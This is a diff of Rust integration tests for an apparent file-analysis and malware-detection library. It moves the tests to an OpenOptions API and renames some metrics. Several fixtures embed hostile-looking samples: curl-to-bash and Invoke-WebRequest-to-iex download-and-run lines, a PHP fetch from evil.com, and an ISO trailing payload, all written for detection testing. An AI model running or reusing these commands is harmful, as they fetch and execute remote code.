@@ -4,34 +4,16 @@
 //! guarantee (`parse_count() == 1` once those views have been read) so
 //! the contract holds for downstream embedders.
 
-use filefacts::{FileType, Symbol, SymbolKind};
+// These tests assert `parse_count() == 1`, which holds only when this process
+// runs the extraction itself. The disk cache that could serve a warm entry
+// instead is off unless an `OpenOptions` asks for it.
+use filefacts::{FileType, FlowKind, OpenOptions, Symbol, SymbolKind, open};
 
 // Embedded rather than read at run time, so the tests do not depend on the
 // working directory.
 const PE_FIXTURE: &[u8] = include_bytes!("fixtures/test.exe");
 const ELF_FIXTURE: &[u8] = include_bytes!("fixtures/test.elf");
 const MACHO_FIXTURE: &[u8] = include_bytes!("fixtures/test.macho");
-
-/// Hermetic `open`: these tests assert `parse_count() == 1`, which only
-/// holds when this process actually runs the extraction pipeline. The
-/// cross-process disk cache is on by default outside filefacts' own unit
-/// tests (`!cfg!(test)`), but that guard does not reach integration tests —
-/// here the crate is linked as an ordinary dependency, so the cache would
-/// serve a warm entry from a prior run and leave the count at 0. Routing
-/// every test through these wrappers forces the cache off process-wide.
-/// Idempotent and safe under parallel test execution.
-fn open(bytes: &[u8]) -> Result<filefacts::ParsedFile<'_>, filefacts::Error> {
-    filefacts::cache::set_caching_enabled(false);
-    filefacts::open(bytes)
-}
-
-fn open_with_path<'a>(
-    path: &std::path::Path,
-    bytes: &'a [u8],
-) -> Result<filefacts::ParsedFile<'a>, filefacts::Error> {
-    filefacts::cache::set_caching_enabled(false);
-    filefacts::open_with_path(path, bytes)
-}
 
 /// Convenience: collect every call target (`Symbol::Call.target`) from a
 /// parsed file, dropping dynamic-callee entries.
@@ -71,7 +53,9 @@ fn function_names(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
 #[test]
 fn cpan_makefile_pl_retains_perl_calls() {
     let bytes = b"use strict;\nuse warnings;\nuse ExtUtils::MakeMaker;\nWriteMakefile(NAME => 'Example');\n";
-    let parsed = open_with_path(std::path::Path::new("Example-1.0/Makefile.PL"), bytes).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("Example-1.0/Makefile.PL"))
+        .open(bytes);
     assert_eq!(parsed.fileid().file_type(), FileType::Perl);
     assert!(
         call_targets(&parsed)
@@ -87,7 +71,9 @@ fn cpan_makefile_pl_retains_perl_calls() {
 #[test]
 fn json_manifest_parses_once_through_all_views() {
     let bytes = br#"{"name":"sample","version":"1.0.0","scripts":{"preinstall":"echo hi"}}"#;
-    let parsed = open_with_path(std::path::Path::new("package.json"), bytes).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("package.json"))
+        .open(bytes);
     assert_eq!(parsed.fileid().file_type(), FileType::PackageJson);
 
     let values = parsed.values();
@@ -115,11 +101,9 @@ fn json_manifest_parses_once_through_all_views() {
 
 #[test]
 fn generic_json_parses_below_limit() {
-    let parsed = open_with_path(
-        std::path::Path::new("payload.json"),
-        br#"{"cookie":"alert(1)"}"#,
-    )
-    .unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("payload.json"))
+        .open(br#"{"cookie":"alert(1)"}"#);
     assert_eq!(parsed.fileid().file_type(), FileType::Json);
     assert_eq!(
         parsed
@@ -136,7 +120,9 @@ fn generic_json_parse_limit_skips_values() {
     bytes.extend(std::iter::repeat_n(b'a', 76 * 1024));
     bytes.extend_from_slice(br#""}"#);
 
-    let parsed = open_with_path(std::path::Path::new("payload.json"), &bytes).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("payload.json"))
+        .open(&bytes);
     assert_eq!(parsed.fileid().file_type(), FileType::Json);
     assert_eq!(
         parsed
@@ -153,7 +139,7 @@ fn zip_archive_emits_member_listing_and_aggregates() {
     // Hand-build a minimal ZIP with three regular-file entries so we
     // don't depend on an external fixture for an integration test.
     let bytes = build_minimal_zip();
-    let parsed = open(&bytes).unwrap();
+    let parsed = open(&bytes);
     assert_eq!(parsed.fileid().file_type(), FileType::Zip);
 
     let values = parsed.values();
@@ -226,7 +212,7 @@ fn zip_archive_emits_member_listing_and_aggregates() {
 
 #[test]
 fn empty_input_classifies_and_exposes_metrics() {
-    let parsed = open(&[]).unwrap();
+    let parsed = open(&[]);
     // An empty byte slice has no meaningful format; we still expose
     // file.size and file.entropy so downstream consumers can
     // observe the degenerate case uniformly.
@@ -238,7 +224,9 @@ fn empty_input_classifies_and_exposes_metrics() {
 #[test]
 fn source_ast_borrows_cached_tree_without_extraction_pass() {
     let source = b"function main() { return fetch('https://example.com'); }";
-    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("sample.js"))
+        .open(source);
 
     let ast = parsed.source_ast().expect("source AST should be available");
     assert_eq!(ast.source, std::str::from_utf8(source).unwrap());
@@ -261,7 +249,9 @@ fn javascript_ast_projection_is_complete() {
         fetch('https://api.example.com/data');
         const decoded = atob("aGVsbG8=");
     "#;
-    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("sample.js"))
+        .open(source);
     assert_eq!(parsed.fileid().file_type(), FileType::JavaScript);
 
     let targets = call_targets(&parsed);
@@ -335,7 +325,9 @@ def run_command():
     env_copy = os.environ.copy()
     return sp.check_output(["/bin/echo", env_copy.get("USER", "unknown")]).decode()
 "#;
-    let parsed = open_with_path(std::path::Path::new("sample.py"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("sample.py"))
+        .open(source);
     assert_eq!(parsed.fileid().file_type(), FileType::Python);
 
     let imports = import_names(&parsed);
@@ -397,7 +389,9 @@ curl -sL "http://example.invalid/stage.sh" | bash
 -H "Header: value"
 chmod +x ./stage.sh
 "#;
-    let parsed = open_with_path(std::path::Path::new("stage.sh"), shell).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("stage.sh"))
+        .open(shell);
     let targets = call_targets(&parsed);
     assert!(
         targets.contains(&"curl".to_string()) && targets.contains(&"bash".to_string()),
@@ -411,7 +405,9 @@ chmod +x ./stage.sh
     let ps = br#"Invoke-WebRequest -Uri "http://example.invalid/stage.ps1" | iex
 Start-Process powershell -ArgumentList "-nop", "-w hidden"
 "#;
-    let parsed = open_with_path(std::path::Path::new("stage.ps1"), ps).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("stage.ps1"))
+        .open(ps);
     let targets = call_targets(&parsed);
     assert!(
         targets.contains(&"Invoke-WebRequest".to_string())
@@ -429,7 +425,9 @@ fn typed_fact_views_are_not_mirrored_in_values() {
         function main() { return 'ok'; }
         fetch('https://example.com');
     ";
-    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("sample.js"))
+        .open(source);
 
     assert!(
         !import_names(&parsed).is_empty(),
@@ -471,7 +469,7 @@ fn typed_fact_views_are_not_mirrored_in_values() {
 
 #[test]
 fn binary_typed_fact_views_are_not_mirrored_in_values() {
-    let parsed = open(PE_FIXTURE).unwrap();
+    let parsed = open(PE_FIXTURE);
 
     assert!(
         !import_names(&parsed).is_empty(),
@@ -505,16 +503,18 @@ fn ast_metrics_mirror_ast_paths() {
     // Verify the metric-naming convention: AST-derived metrics use
     // the `ast.` prefix and mirror the view's path shape.
     let source = b"const a = [1,2,3,4,5,6,7,8,9,10,11,12]; const u = 'a'+'b'+'c'+'d';";
-    let parsed = open_with_path(std::path::Path::new("x.js"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("x.js"))
+        .open(source);
     let m = parsed.metrics();
     assert!(m.get("ast.node_count").unwrap_or(0.0) > 0.0);
-    assert_eq!(m.get("ast.max_array_len"), Some(12.0));
+    assert_eq!(m.get("ast.max_array_length"), Some(12.0));
     assert_eq!(m.get("ast.max_concat_chain"), Some(4.0));
 }
 
 #[test]
 fn non_source_file_yields_empty_ast() {
-    let parsed = open(b"{\"name\":\"x\"}").unwrap();
+    let parsed = open(b"{\"name\":\"x\"}");
     // No view has been requested yet — parse_count is still 0.
     assert_eq!(parsed.parse_count(), 0);
     // The first view access (any of them) bumps parse_count to 1.
@@ -535,7 +535,7 @@ fn non_source_file_yields_empty_ast() {
 #[test]
 fn unrecognised_bytes_still_extract_generic_metrics() {
     let bytes = vec![0xaa_u8; 4096];
-    let parsed = open(&bytes).unwrap();
+    let parsed = open(&bytes);
     let m = parsed.metrics();
     assert_eq!(m.get("file.size"), Some(4096.0));
     // A single repeated byte has zero entropy.
@@ -543,13 +543,15 @@ fn unrecognised_bytes_still_extract_generic_metrics() {
     assert_eq!(parsed.parse_count(), 1);
 }
 
-/// open_with_path should populate file.basename and file.stem in the
+/// `OpenOptions::path` should populate file.basename and file.stem in the
 /// values tree so traits can match on them via
 /// `type: value, path: file.basename`.
 #[test]
-fn open_with_path_populates_file_basename_and_stem() {
+fn path_option_populates_file_basename_and_stem() {
     let bytes = b"# Hello\n";
-    let parsed = open_with_path(std::path::Path::new("/tmp/README.md"), bytes).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("/tmp/README.md"))
+        .open(bytes);
     let values = parsed.values();
     assert_eq!(
         values.get("file.basename").and_then(|v| v.as_str()),
@@ -567,7 +569,7 @@ fn open_with_path_populates_file_basename_and_stem() {
 #[test]
 fn open_without_path_omits_file_basename() {
     let bytes = b"\x7fELF\x02\x01\x01\x00";
-    let parsed = open(bytes).unwrap();
+    let parsed = open(bytes);
     let values = parsed.values();
     assert!(values.get("file.basename").is_none());
     assert!(values.get("file.stem").is_none());
@@ -577,7 +579,9 @@ fn open_without_path_omits_file_basename() {
 /// the stem (matches Python pathlib).
 #[test]
 fn file_stem_handles_dotfiles() {
-    let parsed = open_with_path(std::path::Path::new("/p/.gitignore"), b"").unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("/p/.gitignore"))
+        .open(b"");
     let v = parsed.values();
     assert_eq!(
         v.get("file.basename").and_then(|x| x.as_str()),
@@ -618,7 +622,9 @@ fn python_xor_operator_density_metric() {
     return bytes(c ^ k[i % len(k)] for i, c in enumerate(b))
 x = a ^ b ^ c
 "#;
-    let parsed = open_with_path(std::path::Path::new("x.py"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("x.py"))
+        .open(source);
     let m = parsed.metrics();
     assert_eq!(m.get("ast.op.xor"), Some(3.0), "three `^` operators -> xor");
     assert_eq!(m.get("ast.op.mod"), Some(1.0), "one `%` operator -> mod");
@@ -635,7 +641,9 @@ fn js_identity_function_density_metric() {
         const c = (z) => z;
         function d(p, q) { return p + q; }
     "#;
-    let parsed = open_with_path(std::path::Path::new("x.js"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("x.js"))
+        .open(source);
     assert_eq!(
         parsed.metrics().get("ast.identity_function_count"),
         Some(3.0),
@@ -653,7 +661,9 @@ int legit_function(void) { return 0; }
 /* multi-line
    stealth note */
 "#;
-    let parsed = open_with_path(std::path::Path::new("m.c"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("m.c"))
+        .open(source);
     let comments = parsed.comments();
     let joined: String = comments
         .iter()
@@ -682,7 +692,9 @@ int legit_function(void) { return 0; }
 #[test]
 fn java_constructor_calls_resolve_to_call_targets() {
     let src = br#"class C { void m() { Runtime r = new ProcessBuilder("sh"); var o = new java.io.ObjectInputStream(x); } }"#;
-    let parsed = open_with_path(std::path::Path::new("C.java"), src).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("C.java"))
+        .open(src);
     let targets = call_targets(&parsed);
     assert!(
         targets.contains(&"ProcessBuilder".to_string()),
@@ -698,7 +710,9 @@ fn java_constructor_calls_resolve_to_call_targets() {
 fn csharp_qualified_constructor_resolves() {
     let src =
         br#"class C { void m() { var r = new System.Random(); var f = new BinaryFormatter(); } }"#;
-    let parsed = open_with_path(std::path::Path::new("C.cs"), src).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("C.cs"))
+        .open(src);
     let targets = call_targets(&parsed);
     assert!(
         targets
@@ -720,7 +734,9 @@ fn string_return_functions_are_counted() {
         function c(x) { return x + 1; }
         const d = () => "delta";
     "#;
-    let parsed = open_with_path(std::path::Path::new("s.js"), src).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("s.js"))
+        .open(src);
     assert_eq!(
         parsed.metrics().get("ast.string_return_function_count"),
         Some(3.0),
@@ -740,7 +756,9 @@ fn interpolated_template_url_builders_are_not_counted() {
         const UNIPROT = (id) => `https://rest.uniprot.org/uniprotkb/${id}.json`;
         function key(p) { return `${p.position}-${p.category}`; }
     "#;
-    let parsed = open_with_path(std::path::Path::new("u.js"), src).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("u.js"))
+        .open(src);
     assert_eq!(
         parsed.metrics().get("ast.string_return_function_count"),
         None,
@@ -757,7 +775,9 @@ fn non_interpolated_template_returns_are_counted() {
         function c() { return `gamma`; }
         function d() { return `delta`; }
     "#;
-    let parsed = open_with_path(std::path::Path::new("t.js"), src).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("t.js"))
+        .open(src);
     assert_eq!(
         parsed.metrics().get("ast.string_return_function_count"),
         Some(4.0),
@@ -771,21 +791,27 @@ fn xor_mod_loop_is_detected() {
     let py = br#"def dec(b,k):
     return bytes(c ^ k[i % len(k)] for i,c in enumerate(b))
 "#;
-    let p = open_with_path(std::path::Path::new("d.py"), py).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("d.py"))
+        .open(py);
     assert!(
         p.metrics().get("ast.xor_mod_loop_count").unwrap_or(0.0) >= 1.0,
         "python rolling-xor: {:?}",
         p.metrics().get("ast.xor_mod_loop_count")
     );
     // Plain xor without modulo must NOT count.
-    let plain = open_with_path(std::path::Path::new("p.py"), b"x = a ^ b\n").unwrap();
+    let plain = OpenOptions::new()
+        .path(std::path::Path::new("p.py"))
+        .open(b"x = a ^ b\n");
     assert_eq!(plain.metrics().get("ast.xor_mod_loop_count"), None);
 }
 
 #[test]
 fn php_call_string_arg_value_is_captured() {
     let src = br#"<?php $d = file_get_contents("http://evil.com/x");"#;
-    let p = open_with_path(std::path::Path::new("f.php"), src).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("f.php"))
+        .open(src);
     let arg = p
         .symbols()
         .iter_kind(SymbolKind::Call)
@@ -807,7 +833,9 @@ fn php_call_string_arg_value_is_captured() {
 #[test]
 fn numeric_array_max_length_metric() {
     let py = b"a = [112, 97, 121, 108, 111, 97, 100]\nb = ['x','y','z']\n";
-    let p = open_with_path(std::path::Path::new("n.py"), py).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("n.py"))
+        .open(py);
     assert_eq!(
         p.metrics().get("ast.max_numeric_array"),
         Some(7.0),
@@ -821,7 +849,9 @@ fn elixir_call_arguments_survive_unfielded_argument_lists() {
         "System.cmd(\"printf\", [\"hello\"])\n",
         "System.cmd \"printf\", [\"hello\"]\n",
     ] {
-        let p = open_with_path(std::path::Path::new("args.ex"), source.as_bytes()).unwrap();
+        let p = OpenOptions::new()
+            .path(std::path::Path::new("args.ex"))
+            .open(source.as_bytes());
         let args = p
             .symbols()
             .iter_kind(SymbolKind::Call)
@@ -861,7 +891,9 @@ my $callback = sub { return 'four' };
 # counterfeit('six');
 my $doc = "pretend('seven')";
 "#;
-    let p = open_with_path(std::path::Path::new("calls.pl"), source).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("calls.pl"))
+        .open(source);
     assert_eq!(call_targets(&p), ["emit", "Example::emit", "system"]);
     let flow = p.flow().unwrap();
     let targets: Vec<_> = flow
@@ -884,7 +916,9 @@ ${factory()}->emit('hello');
 # $client->comment_only('hello');
 my $documentation = '$client->quoted_only("hello")';
 "#;
-    let parsed = open_with_path(std::path::Path::new("methods.pl"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("methods.pl"))
+        .open(source);
     let targets = call_targets(&parsed);
     for expected in [
         "Example::Client.new",
@@ -921,7 +955,7 @@ my $documentation = '$client->quoted_only("hello")';
         else {
             unreachable!()
         };
-        assert!(flow.values.iter().any(|value| value.kind == "call"
+        assert!(flow.values.iter().any(|value| value.kind == FlowKind::Call
             && value.offset == *offset as usize
             && value.target.as_ref() == target.as_ref()));
     }
@@ -931,7 +965,9 @@ my $documentation = '$client->quoted_only("hello")';
 #[test]
 fn perl_single_argument_is_not_mistaken_for_argument_list() {
     let source = b"emit('one'); emit(17); emit(inner('nested')); emit('a', 'b'); emit();\n";
-    let p = open_with_path(std::path::Path::new("args.pl"), source).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("args.pl"))
+        .open(source);
     let calls: Vec<_> = p
         .symbols()
         .iter_kind(SymbolKind::Call)
@@ -983,7 +1019,9 @@ open $input, '<', 'README';
 # pretend 'comment';
 my $example = "counterfeit 'quoted'";
 "#;
-    let parsed = open_with_path(std::path::Path::new("list_calls.pl"), source).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("list_calls.pl"))
+        .open(source);
     let calls: Vec<_> = parsed.symbols().iter_kind(SymbolKind::Call).collect();
     assert_eq!(
         call_targets(&parsed),
@@ -1012,7 +1050,7 @@ my $example = "counterfeit 'quoted'";
         let value = flow
             .values
             .iter()
-            .find(|value| value.kind == "call" && value.offset == *offset as usize)
+            .find(|value| value.kind == FlowKind::Call && value.offset == *offset as usize)
             .unwrap();
         assert_eq!(value.target.as_ref(), target.as_ref());
         assert_eq!(value.inputs.len(), bare.len());
@@ -1024,7 +1062,9 @@ my $example = "counterfeit 'quoted'";
 fn elixir_arguments_do_not_include_nested_calls_or_do_blocks() {
     let source =
         b"consume(produce(\"inner\"), \"outer\")\nempty()\nwrapper do\n nested(\"body\")\nend\n";
-    let p = open_with_path(std::path::Path::new("nested.ex"), source).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("nested.ex"))
+        .open(source);
     for (name, count) in [
         ("consume", 2),
         ("produce", 1),
@@ -1069,7 +1109,9 @@ fn elixir_heredoc_cases() -> [(&'static str, &'static str); 8] {
 fn elixir_heredoc_literals_strip_delimiters_and_indentation() {
     for (literal, expected) in elixir_heredoc_cases() {
         let source = format!("consume({literal})\n");
-        let p = open_with_path(std::path::Path::new("heredoc.ex"), source.as_bytes()).unwrap();
+        let p = OpenOptions::new()
+            .path(std::path::Path::new("heredoc.ex"))
+            .open(source.as_bytes());
         assert!(
             p.literals().iter().any(|s| s.text == expected),
             "{literal}: {:?}",
@@ -1083,7 +1125,9 @@ fn elixir_heredoc_literals_strip_delimiters_and_indentation() {
 fn elixir_heredoc_arguments_agree_with_flow_values() {
     for (literal, expected) in elixir_heredoc_cases() {
         let source = format!("consume({literal})\n");
-        let p = open_with_path(std::path::Path::new("heredoc.ex"), source.as_bytes()).unwrap();
+        let p = OpenOptions::new()
+            .path(std::path::Path::new("heredoc.ex"))
+            .open(source.as_bytes());
         let args = p
             .symbols()
             .iter_kind(SymbolKind::Call)
@@ -1116,15 +1160,19 @@ fn elixir_heredoc_arguments_agree_with_flow_values() {
 fn numeric_sequence_max_length_metric() {
     // JS comma sequence of numeric literals (comma-constant obfuscation).
     let js = b"var x = (1, 2, 3, 4, 5);\n";
-    let p = open_with_path(std::path::Path::new("s.js"), js).unwrap();
-    assert_eq!(p.metrics().get("ast.max_numeric_seq"), Some(5.0));
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("s.js"))
+        .open(js);
+    assert_eq!(p.metrics().get("ast.max_numeric_sequence"), Some(5.0));
 }
 
 #[test]
 fn const_return_function_count_metric() {
     let js =
         b"function a(){ return 0; }\nfunction b(){ return 'x'; }\nfunction id(y){ return y; }\n";
-    let p = open_with_path(std::path::Path::new("c.js"), js).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("c.js"))
+        .open(js);
     // a() and b() are parameterless const-returns; id(y) is an identity proxy, not counted.
     assert_eq!(
         p.metrics().get("ast.const_return_function_count"),
@@ -1137,21 +1185,27 @@ fn self_compare_count_metric() {
     // `5 - 5` (useless arithmetic) and `x === x` (opaque) count; `n !== n`
     // (the NaN idiom) does not.
     let js = b"var a = 5 - 5;\nif (x === x) {}\nif (n !== n) {}\n";
-    let p = open_with_path(std::path::Path::new("sc.js"), js).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("sc.js"))
+        .open(js);
     assert_eq!(p.metrics().get("ast.self_compare_count"), Some(2.0));
 }
 
 #[test]
 fn infinite_loop_count_metric() {
     let rb = b"while true\n  break\nend\n";
-    let p = open_with_path(std::path::Path::new("l.rb"), rb).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("l.rb"))
+        .open(rb);
     assert_eq!(p.metrics().get("ast.infinite_loop_count"), Some(1.0));
 }
 
 #[test]
 fn infinite_loop_js_while_true() {
     let js = b"while (true) { f(); }\nwhile (x < 10) { g(); }\n";
-    let p = open_with_path(std::path::Path::new("w.js"), js).unwrap();
+    let p = OpenOptions::new()
+        .path(std::path::Path::new("w.js"))
+        .open(js);
     // Only `while (true)` is infinite; the bounded loop is not.
     assert_eq!(p.metrics().get("ast.infinite_loop_count"), Some(1.0));
 }
@@ -1396,7 +1450,9 @@ fn iso_members_carry_sliceable_extents_and_joliet_names() {
         "IMGBURN V2.5.8.0 - THE ULTIMATE IMAGE BURNER!",
         b"",
     );
-    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("d.iso"))
+        .open(&iso);
     assert_eq!(parsed.fileid().file_type(), FileType::Iso);
 
     let members = parsed.archive_members();
@@ -1446,7 +1502,9 @@ fn iso_member_present_in_one_namespace_only_is_still_surfaced() {
         "",
         b"",
     );
-    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("d.iso"))
+        .open(&iso);
 
     let names: Vec<&str> = parsed
         .archive_members()
@@ -1472,7 +1530,7 @@ fn iso_member_present_in_one_namespace_only_is_still_surfaced() {
     );
     // No mastering tool stamped any identifier field.
     assert_eq!(
-        parsed.metrics().get("iso.blank_identifier_fields"),
+        parsed.metrics().get("iso.blank_identifier_count"),
         Some(5.0)
     );
     assert_eq!(parsed.parse_count(), 1);
@@ -1485,7 +1543,9 @@ fn iso_member_present_in_one_namespace_only_is_still_surfaced() {
 fn iso_trailing_data_is_reported_as_an_unclaimed_member() {
     let payload = b"#!/bin/sh\ncurl http://example.invalid/x | sh\n";
     let iso = build_minimal_iso(&[("README", "ReadMe.txt", b"clean\n")], &[], "", payload);
-    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("d.iso"))
+        .open(&iso);
 
     assert_eq!(
         parsed.metrics().get("iso.trailing_bytes"),
@@ -1526,7 +1586,9 @@ fn iso_without_hidden_space_reports_no_slack() {
         "MKISOFS ISO 9660/HFS FILESYSTEM BUILDER",
         b"",
     );
-    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();
+    let parsed = OpenOptions::new()
+        .path(std::path::Path::new("d.iso"))
+        .open(&iso);
     assert_eq!(parsed.metrics().get("iso.unallocated_bytes"), Some(0.0));
     assert_eq!(
         parsed.metrics().get("iso.unclaimed_region_count"),
@@ -1555,7 +1617,7 @@ fn pseudo_random(len: usize) -> Vec<u8> {
 /// `binary.overlay_size`/`binary.overlay_entropy` for `bytes`, asserting
 /// the entropy span starts exactly where the overlay does.
 fn overlay_of(bytes: &[u8]) -> Option<(u64, u64)> {
-    let parsed = open(bytes).unwrap();
+    let parsed = open(bytes);
     let metrics = parsed.metrics();
     let size = metrics.get("binary.overlay_size")? as u64;
     assert_eq!(metrics.get("binary.has_overlay"), Some(1.0));
@@ -1584,7 +1646,7 @@ fn macho_bytes_past_linkedit_are_an_overlay() {
     let image_len = bytes.len() as u64;
     bytes.extend(pseudo_random(4096));
     assert_eq!(overlay_of(&bytes), Some((image_len, 4096)));
-    let parsed = open(&bytes).unwrap();
+    let parsed = open(&bytes);
     assert!(parsed.metrics().get("binary.overlay_entropy").unwrap() > 7.0);
 }
 
@@ -1604,7 +1666,7 @@ fn fat_macho_overlay_is_past_the_last_slice() {
     bytes.extend(12_u32.to_be_bytes()); // align 2^12
     bytes.resize(slice_offset as usize, 0);
     bytes.extend(slice);
-    assert_eq!(open(&bytes).unwrap().fileid().file_type(), FileType::MachO);
+    assert_eq!(open(&bytes).fileid().file_type(), FileType::MachO);
     assert_eq!(overlay_of(&bytes), None);
 
     let image_len = bytes.len() as u64;
